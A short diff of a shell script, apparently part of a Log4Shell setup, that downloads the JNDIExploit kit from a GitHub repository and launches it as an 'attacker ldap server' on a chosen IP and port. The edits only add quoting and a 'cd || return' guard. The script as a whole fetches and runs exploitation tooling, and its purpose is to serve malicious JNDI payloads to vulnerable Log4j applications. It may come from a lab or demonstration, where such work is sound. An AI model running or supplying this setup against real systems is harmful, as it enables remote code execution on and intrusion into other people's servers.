@@ -9,7 +9,7 @@ if [ ! -d "${APP_DIR}" ]; then
     mkdir -p "${APP_DIR}"
 fi
 
-cd "${APP_DIR}"
+cd "${APP_DIR}" || return
 
 if [ ! -f "${APP_DIR}/JNDIExploit-1.2-SNAPSHOT.jar" ]; then
     curl -LOJ "https://github.com/black9/Log4shell_JNDIExploit/raw/main/JNDIExploit.v1.2.zip"
@@ -18,4 +18,4 @@ if [ ! -f "${APP_DIR}/JNDIExploit-1.2-SNAPSHOT.jar" ]; then
 fi
 
 # run attacker ldap server
-java -jar JNDIExploit-1.2-SNAPSHOT.jar -i ${APP_IP} -p ${APP_PORT}
+java -jar JNDIExploit-1.2-SNAPSHOT.jar -i "${APP_IP}" -p "${APP_PORT}"
